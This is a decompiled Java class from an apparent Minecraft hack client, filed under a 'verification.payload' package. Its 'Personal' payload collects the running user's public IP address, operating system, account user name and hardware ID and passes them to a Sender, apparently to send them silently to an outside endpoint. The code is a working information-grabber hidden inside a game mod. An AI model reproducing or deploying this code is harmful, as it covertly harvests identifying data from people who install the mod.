//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.net.*;
import java.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;

public final class Personal implements Payload
{
    @Override
    public void execute() throws Exception {
        final String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();
        Sender.send(new Message.Builder("Personal").addField("IP", ip, true).addField("OS", System.getProperty("os.name"), true).addField("Name", System.getProperty("user.name"), true).addField("HWID", HWIDUtil.getID(), true).build());
    }
}
